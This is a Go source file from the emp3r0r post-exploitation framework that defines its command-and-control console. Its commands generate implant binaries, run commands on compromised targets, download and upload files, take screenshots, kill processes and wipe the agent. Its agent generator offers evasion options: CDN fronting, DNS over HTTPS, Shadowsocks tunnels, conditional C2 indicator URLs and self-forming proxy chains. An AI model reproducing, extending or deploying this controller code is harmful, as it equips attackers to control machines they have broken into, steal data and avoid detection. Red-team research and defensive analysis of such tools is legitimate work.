//go:build linux
// +build linux

package cc

import (
	"fmt"
	"os"
	"sync"

	emp3r0r_def "github.com/jm33-m0/emp3r0r/core/lib/emp3r0r_def"
	"github.com/jm33-m0/emp3r0r/core/lib/tun"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
	"github.com/reeflective/console"
	"github.com/reeflective/console/commands/readline"
	"github.com/rsteube/carapace"
	"github.com/spf13/cobra"
)

type Command struct {
	Name   string
	Help   string
	Func   interface{}
	HasArg bool
}

// CommandMap holds all commands
func Emp3r0rCommands(app *console.Console) console.Commands {
	return func() *cobra.Command {
		rootCmd := &cobra.Command{}
		rootCmd.Short = "Emp3r0r Console"

		rootCmd.AddGroup(
			&cobra.Group{ID: "core", Title: "Core Commands"},
			&cobra.Group{ID: "module", Title: "Module Commands"},
			&cobra.Group{ID: "filesystem", Title: "File system Commands"},
			&cobra.Group{ID: "network", Title: "Network Commands"},
			&cobra.Group{ID: "agent", Title: "Agent Commands"},
			&cobra.Group{ID: "c2", Title: "C2 commands"},
			&cobra.Group{ID: "util", Title: "Miscellaneous utilities"},
		)
		// add readline commands to configure the shell
		rootCmd.AddCommand(readline.Commands(app.Shell()))

		exitCmd := &cobra.Command{
			Use:     "exit",
			Aliases: []string{"quit", "q", "bye", "logout", "shutdown", "stop"},
			GroupID: "core",
			Short:   "Exit emp3r0r",
			Args:    cobra.NoArgs,
			Run: func(cmd *cobra.Command, args []string) {
				exitEmp3r0r(app)
			},
		}
		rootCmd.AddCommand(exitCmd)

		// this command will be used to generate an agent binary
		rootCmd.AddCommand(gen_agent_cmd())

		helpCmd := &cobra.Command{
			Use:     "help",
			GroupID: "core",
			Short:   "Display help for a module",
			Example: "help bring2cc",
			Args:    cobra.ExactArgs(1),
			Run:     CmdHelp,
		}
		rootCmd.AddCommand(helpCmd)
		carapace.Gen(helpCmd).PositionalCompletion(carapace.ActionValues(listMods()...))

		setDebuglevelCmd := &cobra.Command{
			Use:     "debug",
			GroupID: "core",
			Short:   "Set debug level: 0 (least verbose) to 3 (most verbose)",
			Example: "debug --level 3",
			Run:     setDebugLevel,
		}
		setDebuglevelCmd.Flags().IntP("level", "l", 0, "Debug level")
		rootCmd.AddCommand(setDebuglevelCmd)
		carapace.Gen(setDebuglevelCmd).FlagCompletion(carapace.ActionMap{
			"level": carapace.ActionValues("0", "1", "2", "3"),
		})

		useModuleCmd := &cobra.Command{
			Use:     "use",
			GroupID: "module",
			Short:   "Use a module",
			Example: "use bring2cc",
			Args:    cobra.ExactArgs(1),
			Run:     setActiveModule,
		}
		rootCmd.AddCommand(useModuleCmd)
		carapace.Gen(useModuleCmd).PositionalCompletion(carapace.ActionValues(listMods()...))

		infoCmd := &cobra.Command{
			Use:     "info",
			GroupID: "module",
			Short:   "What options do we have?",
			Args:    cobra.NoArgs,
			Run:     listModOptionsTable,
		}
		rootCmd.AddCommand(infoCmd)

		setCmd := &cobra.Command{
			Use:     "set",
			GroupID: "module",
			Short:   "Set an option of the current module",
			Example: "set cc_host emp3r0r.com",
			Args:    cobra.ExactArgs(2),
			Run:     setOptValCmd,
		}
		rootCmd.AddCommand(setCmd)
		carapace.Gen(setCmd).PositionalCompletion(
			carapace.ActionValues(listOptions()...),
			carapace.ActionValues(listValChoices()...))

		runCmd := &cobra.Command{
			Use:     "run",
			GroupID: "module",
			Short:   "Run the current module",
			Args:    cobra.NoArgs,
			Run:     ModuleRun,
		}
		rootCmd.AddCommand(runCmd)

		targetCmd := &cobra.Command{
			Use:     "target",
			GroupID: "agent",
			Short:   "Set active target",
			Example: "target 0",
			Args:    cobra.ExactArgs(1),
			Run:     setActiveTarget,
		}
		rootCmd.AddCommand(targetCmd)
		carapace.Gen(targetCmd).PositionalCompletion(carapace.ActionValues(listTargetIndexTags()...))

		upgradeAgentCmd := &cobra.Command{
			Use:     "upgrade_agent",
			GroupID: "agent",
			Short:   "Upgrade agent on selected target, put agent binary in /tmp/emp3r0r/www/agent first",
			Run:     UpgradeAgent,
			Args:    cobra.NoArgs,
		}
		rootCmd.AddCommand(upgradeAgentCmd)

		upgradeCCCmd := &cobra.Command{
			Use:     "upgrade_cc",
			GroupID: "c2",
			Short:   "Upgrade emp3r0r from GitHub",
			Example: "upgrade_cc [--force]",
			Run:     UpdateCC,
		}
		upgradeCCCmd.Flags().BoolP("force", "f", false, "Force upgrade")
		rootCmd.AddCommand(upgradeCCCmd)

		fileManagerCmd := &cobra.Command{
			Use:     "file_manager",
			GroupID: "filesystem",
			Short:   "Browse remote files in your local file manager with SFTP protocol",
			Args:    cobra.NoArgs,
			Run:     OpenFileManager,
		}
		rootCmd.AddCommand(fileManagerCmd)

		lsCmd := &cobra.Command{
			Use:     "ls",
			GroupID: "filesystem",
			Short:   "List a directory of selected agent, without argument it lists current directory",
			Example: "ls /tmp",
			Args:    cobra.MaximumNArgs(1),
			Run:     ls,
		}
		rootCmd.AddCommand(lsCmd)
		carapace.Gen(lsCmd).PositionalCompletion(carapace.ActionValues(listRemoteDir()...))

		cdCmd := &cobra.Command{
			Use:     "cd",
			GroupID: "filesystem",
			Short:   "Change current working directory of selected agent",
			Args:    cobra.ExactArgs(1),
			Run:     cd,
		}
		rootCmd.AddCommand(cdCmd)
		carapace.Gen(cdCmd).PositionalCompletion(carapace.ActionValues(listRemoteDir()...))

		cpCmd := &cobra.Command{
			Use:     "cp",
			GroupID: "filesystem",
			Short:   "Copy a file to another location on selected target",
			Example: "cp /tmp/1.txt /tmp/2.txt",
			Args:    cobra.ExactArgs(2),
			Run:     cp,
		}
		rootCmd.AddCommand(cpCmd)
		carapace.Gen(cpCmd).PositionalCompletion(carapace.ActionValues(listRemoteDir()...),
			carapace.ActionValues(listRemoteDir()...))

		mvCmd := &cobra.Command{
			Use:     "mv",
			GroupID: "filesystem",
			Short:   "Move a file to another location on selected target",
			Example: "mv /tmp/1.txt /tmp/2.txt",
			Args:    cobra.ExactArgs(2),
			Run:     mv,
		}
		rootCmd.AddCommand(mvCmd)
		carapace.Gen(mvCmd).PositionalCompletion(carapace.ActionValues(listRemoteDir()...),
			carapace.ActionValues(listRemoteDir()...))

		rmCmd := &cobra.Command{
			Use:     "rm",
			GroupID: "filesystem",
			Short:   "Delete a file/directory on selected agent",
			Example: "rm /tmp/1.txt",
			Args:    cobra.ExactArgs(1),
			Run:     rm,
		}
		rootCmd.AddCommand(rmCmd)
		carapace.Gen(rmCmd).PositionalCompletion(carapace.ActionValues(listRemoteDir()...))

		mkdirCmd := &cobra.Command{
			Use:     "mkdir",
			GroupID: "filesystem",
			Short:   "Create new directory on selected agent",
			Example: "mkdir --path /tmp/newdir",
			Args:    cobra.ExactArgs(1),
			Run:     mkdir,
		}
		rootCmd.AddCommand(mkdirCmd)
		carapace.Gen(mkdirCmd).PositionalCompletion(carapace.ActionValues(listRemoteDir()...))

		pwdCmd := &cobra.Command{
			Use:     "pwd",
			GroupID: "filesystem",
			Short:   "Current working directory of selected agent",
			Args:    cobra.NoArgs,
			Run:     pwd,
		}
		rootCmd.AddCommand(pwdCmd)

		psCmd := &cobra.Command{
			Use:     "ps",
			GroupID: "filesystem",
			Short:   "Process list of selected agent",
			Args:    cobra.NoArgs,
			Run:     ps,
		}
		rootCmd.AddCommand(psCmd)

		netHelperCmd := &cobra.Command{
			Use:     "net_helper",
			GroupID: "network",
			Short:   "Network helper: ip addr, ip route, ip neigh",
			Args:    cobra.NoArgs,
			Run:     net_helper,
		}
		rootCmd.AddCommand(netHelperCmd)

		killCmd := &cobra.Command{
			Use:     "kill",
			GroupID: "util",
			Short:   "Terminate a process on selected agent",
			Example: "kill 1234 5678",
			Args:    cobra.MinimumNArgs(1),
			Run:     kill,
		}
		rootCmd.AddCommand(killCmd)

		getCmd := &cobra.Command{
			Use:     "get",
			GroupID: "filesystem",
			Short:   "Download a file from selected agent",
			Example: "get [--recursive] [--regex '*.pdf'] --path /tmp/1.txt",
			Run:     DownloadFromAgent,
		}
		getCmd.Flags().BoolP("recursive", "r", false, "Download recursively")
		getCmd.Flags().StringP("path", "f", "", "Path to download")
		getCmd.Flags().StringP("regex", "e", "", "Regex to match files")
		rootCmd.AddCommand(getCmd)
		carapace.Gen(getCmd).FlagCompletion(carapace.ActionMap{
			"path": carapace.ActionValues(listRemoteDir()...),
		})

		putCmd := &cobra.Command{
			Use:     "put",
			GroupID: "filesystem",
			Short:   "Upload a file to selected agent",
			Example: "put /tmp/1.txt /tmp/2.txt",
			Run:     UploadToAgent,
		}
		putCmd.Flags().StringP("src", "s", "", "Source file")
		putCmd.Flags().StringP("dst", "d", "", "Destination file")
		rootCmd.AddCommand(putCmd)
		carapace.Gen(putCmd).FlagCompletion(carapace.ActionMap{
			"src": carapace.ActionFiles(),
		})

		screenshotCmd := &cobra.Command{
			Use:     "screenshot",
			GroupID: "util",
			Short:   "Take a screenshot of selected agent",
			Args:    cobra.NoArgs,
			Run:     TakeScreenshot,
		}
		rootCmd.AddCommand(screenshotCmd)

		suicideCmd := &cobra.Command{
			Use:     "suicide",
			GroupID: "agent",
			Short:   "Kill agent process, delete agent root directory",
			Run:     suicide,
		}
		rootCmd.AddCommand(suicideCmd)

		lsModCmd := &cobra.Command{
			Use:     "ls_modules",
			GroupID: "module",
			Short:   "List all modules",
			Args:    cobra.NoArgs,
			Run:     ListModules,
		}
		rootCmd.AddCommand(lsModCmd)

		lsTargetCmd := &cobra.Command{
			Use:     "ls_targets",
			GroupID: "agent",
			Short:   "List connected agents",
			Args:    cobra.NoArgs,
			Run:     ls_targets,
		}
		rootCmd.AddCommand(lsTargetCmd)

		searchCmd := &cobra.Command{
			Use:     "search",
			GroupID: "module",
			Short:   "Search for a module",
			Example: "search shell",
			Args:    cobra.ExactArgs(1),
			Run:     ModuleSearch,
		}
		rootCmd.AddCommand(searchCmd)

		lsPortMapppingsCmd := &cobra.Command{
			Use:     "ls_port_fwds",
			GroupID: "network",
			Short:   "List active port mappings",
			Run:     ListPortFwds,
		}
		rootCmd.AddCommand(lsPortMapppingsCmd)

		rmPortMappingCmd := &cobra.Command{
			Use:     "delete_port_fwd",
			GroupID: "network",
			Short:   "Delete a port mapping session",
			Example: "delete_port_fwd --id <session_id>",
			Run:     DeletePortFwdSession,
		}
		rmPortMappingCmd.Flags().StringP("id", "", "", "Port mapping ID")
		rootCmd.AddCommand(rmPortMappingCmd)
		carapace.Gen(rmPortMappingCmd).FlagCompletion(carapace.ActionMap{
			"id": carapace.ActionValues(listPortMappings()...),
		})

		labelAgentCmd := &cobra.Command{
			Use:     "label",
			GroupID: "agent",
			Short:   "Label an agent with custom name",
			Example: "label --id <agent_id> --label <custom_name>",
			Run:     setTargetLabel,
		}
		labelAgentCmd.Flags().StringP("id", "", "0", "Agent ID")
		labelAgentCmd.Flags().StringP("label", "", "no-label", "Custom name")
		rootCmd.AddCommand(labelAgentCmd)
		carapace.Gen(labelAgentCmd).FlagCompletion(carapace.ActionMap{
			"id":    carapace.ActionValues(listTargetIndexTags()...),
			"label": carapace.ActionValues("no-label", "linux", "windows", "workstation", "server", "dev", "prod", "test", "honeypot"),
		})

		execCmd := &cobra.Command{
			Use:     "exec",
			GroupID: "util",
			Short:   "Execute a command on selected agent",
			Example: "exec --cmd 'ls -la'",
			Run:     execCmd,
		}
		execCmd.Flags().StringP("cmd", "c", "", "Command to execute on agent")
		rootCmd.AddCommand(execCmd)
		carapace.Gen(execCmd).FlagCompletion(carapace.ActionMap{
			"cmd": carapace.ActionValues(listAgentExes()...),
		})

		return rootCmd
	}
}

func execCmd(cmd *cobra.Command, args []string) {
	// get command to execute
	cmdStr, err := cmd.Flags().GetString("cmd")
	if err != nil {
		LogError("Error getting command: %v", err)
		return
	}
	if cmdStr == "" {
		LogError("No command specified")
		return
	}

	// execute command
	err = SendCmdToCurrentTarget(cmdStr, "")
	if err != nil {
		LogError("Error executing command: %v", err)
	}
}

func exitEmp3r0r(_ *console.Console) {
	LogWarning("Exiting emp3r0r... Goodbye!")
	if RuntimeConfig.CCIndicatorURL != "" {
		LogWarning("Remember to remove the conditional C2 indicator URL from your server or agents will make too much noise: %s",
			RuntimeConfig.CCIndicatorURL)
	}
	TmuxDeinitWindows()
	os.Exit(0)
}

// CmdTime Record the time spent on each command
var (
	CmdTime      = make(map[string]string)
	CmdTimeMutex = &sync.Mutex{}
)

// CmdHelp prints help in two columns
// print help for modules
func CmdHelp(cmd *cobra.Command, args []string) {
	mod := args[0]
	help := make(map[string]string)
	if mod == "" {
		LogError("No module specified")
		return
	}

	for modname, modObj := range emp3r0r_def.Modules {
		if mod == modObj.Name {
			if len(modObj.Options) > 0 {
				for opt_name, opt_obj := range modObj.Options {
					help[opt_name] = opt_obj.OptDesc
				}
			} else {
				help[modname] = "No options"
			}
			LogMsg("\n%s", modObj.Comment)
			CliPrettyPrint("Option", "Help", &help)
			return
		}
	}
	LogError("Help yourself")
}

func gen_agent_cmd() *cobra.Command {
	genAgentCmd := &cobra.Command{
		Use:     "generate",
		GroupID: "agent",
		Short:   "Generate an agent binary or implant",
		Example: "generate --type linux_executable --arch amd64",
		Run:     GenerateAgent,
	}
	genAgentCmd.Flags().StringP("type", "t", PayloadTypeLinuxExecutable, fmt.Sprintf("Payload type, available: %v+", PayloadTypeList))
	genAgentCmd.Flags().StringP("arch", "a", "amd64", fmt.Sprintf("Target architecture, available: %v+", Arch_List_All))
	cc_hosts := tun.NamesInCert(ServerCrtFile)
	genAgentCmd.Flags().StringP("cc", "", cc_hosts[0], "C2 server address")
	genAgentCmd.Flags().StringP("cdn", "", "", "CDN proxy to reach C2, leave empty to disable. Example: wss://cdn.example.com/ws")
	genAgentCmd.Flags().StringP("doh", "", "", "DNS over HTTPS server to use for DNS resolution, leave empty to disable. Example: https://1.1.1.1/dns-query")
	genAgentCmd.Flags().StringP("proxy", "", "", "Hard coded proxy URL for agent's C2 transport, leave empty to disable. Example: socks5://127.0.0.1:9050")
	genAgentCmd.Flags().StringP("indicator", "", "", "URL to check for conditional C2 connection, leave empty to disable")
	genAgentCmd.Flags().IntP("indicator-wait-min", "", util.RandInt(30, 120), "How many minimum seconds to wait before checking the indicator URL again")
	genAgentCmd.Flags().IntP("indicator-wait-max", "", 0, "How many maximum seconds to wait before checking the indicator URL again, set to 0 to disable")
	genAgentCmd.Flags().BoolP("shadowsocks", "", false, "Use shadowsocks to connect to C2")
	genAgentCmd.Flags().BoolP("kcp", "", false, "Use shadowsocks with KCP (secure UDP multiplexed tunnel), will enable shadowsocks automatically.")
	genAgentCmd.Flags().BoolP("NCSI", "", false, "Use NCSI to check for Internet connectivity before connecting to C2")
	genAgentCmd.Flags().BoolP("proxychain", "", false, "Enable auto proxy chain, agents will negotiate and form a Shadowsocks proxy chain to reach C2")
	genAgentCmd.Flags().IntP("proxychain-wait-min", "", util.RandInt(30, 120), "How many minimum seconds to wait before sending each broadcast packet to negotiate proxy chain")
	genAgentCmd.Flags().IntP("proxychain-wait-max", "", 0, "How many maximum seconds to wait before sending each broadcast packet to negotiate proxy chain")

	// completers
	carapace.Gen(genAgentCmd).FlagCompletion(carapace.ActionMap{
		"type":      carapace.ActionValues(PayloadTypeList...),
		"arch":      carapace.ActionValues(Arch_List_All...),
		"cc":        carapace.ActionValues(cc_hosts...),
		"cdn":       carapace.ActionValues("wss://", "ws://"),
		"doh":       carapace.ActionValues("https://1.1.1.1/dns-query", "https://8.8.8.8/dns-query", "https://9.9.9.9/dns-query"),
		"proxy":     carapace.ActionValues("socks5://127.0.0.1:9050", "socks5://"),
		"indicator": carapace.ActionValues("https://", "http://"),
	})
	return genAgentCmd
}
